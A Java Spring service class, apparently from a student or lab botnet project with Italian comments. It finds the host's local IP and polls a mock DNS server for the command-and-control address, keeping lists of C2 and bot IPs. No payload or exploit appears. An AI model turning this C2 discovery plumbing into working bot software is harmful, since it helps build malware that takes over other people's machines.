package cs.sii.connection;

import java.lang.reflect.Type;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.nio.channels.NetworkChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.google.common.reflect.TypeToken;

import cs.sii.config.bot.Engine;
import cs.sii.model.Conversions;
import cs.sii.model.IP;
import cs.sii.model.SyncIpList;




@Service("NetworkService")
public class NetworkService {
	
@Autowired
private Engine engineBot;

//Ip dei command e conquer
@Autowired
private SyncIpList commandConquerIps;

//Ip dei bot
@Autowired
private SyncIpList botIps;

@Autowired
private AsyncRequest asyncRequest;

private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";

//Ip della mia macchina
private IP ip;
	
	
public NetworkService(){}
	
//Selezione del IP non necessario
public void selectIp() {

	ArrayList<String> ips = getAllIpAddresses();
	if (ips == null || ips.size()<1) {
		System.err.println("Non sei connesso a nessuna rete");

	}else{
		if(ips.size()>0)
			for (Iterator<String> iterator = ips.iterator(); iterator.hasNext();) {
				String string = (String) iterator.next();
				//TODO da MODIFICARE
				if(string.startsWith("10.192."))
					this.ip= new IP(string);
			}
	}
}

public ArrayList<String> getAllIpAddresses() {

	ArrayList<String> ips = new ArrayList<>();

	try {
		Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
		while (e.hasMoreElements()) {
			NetworkInterface n = (NetworkInterface) e.nextElement();
			Enumeration<?> ee = n.getInetAddresses();
			while (ee.hasMoreElements()) {
				InetAddress i = (InetAddress) ee.nextElement();
				if (i.getHostAddress().matches(IP_REGEX)) {
					ips.add(i.getHostAddress());
				}
			}
		}
	} catch (SocketException e) {
		e.printStackTrace();
		return null;
	}

	return ips;
}

@SuppressWarnings("unchecked")
public boolean firstConnectToMockServerDns() {

	String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
	IP result = new IP("");
	Integer counter = 0;
	
	while (counter <= AsyncRequest.REQNUMBER) {
		try {
			System.out.println("URL: " + url);
			System.out.println("Il mio IP: " + ip);
			result = asyncRequest.getIpCommandAndControlFromDnsServer(url);
			
			System.out.println("Ip tornato "+result);
			//List<String> ips = Conversions.fromJson(result, type);
			/*
			ArrayList<IP> iplist = new ArrayList<>();
			if (ips != null && ips.size() != 0) {
				for (String ip : ips) {
					iplist.add(new IP(ip));
				}
			}
			*/
			//commandConquerIps.setAllIp((List<IP>) iplist.clone());
			
			commandConquerIps.addIP(result);
//
			System.out.println("Numero di IP ottenuti: " + commandConquerIps.getIPList().size());
			commandConquerIps.getIPList().forEach(ip -> System.out.println(ip));

			return Boolean.TRUE;
		} catch (Exception ex) {
			System.err.println("Errore durante la richiesta di IP\n" + ex);
			counter++;
		}

		try {
			Thread.sleep(250);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	return Boolean.FALSE;
}


public boolean updateBotNetwork(){
return true;
}

public SyncIpList getCommandConquerIps() {
	return commandConquerIps;
}

public SyncIpList getBotIps() {
	return botIps;
}


}
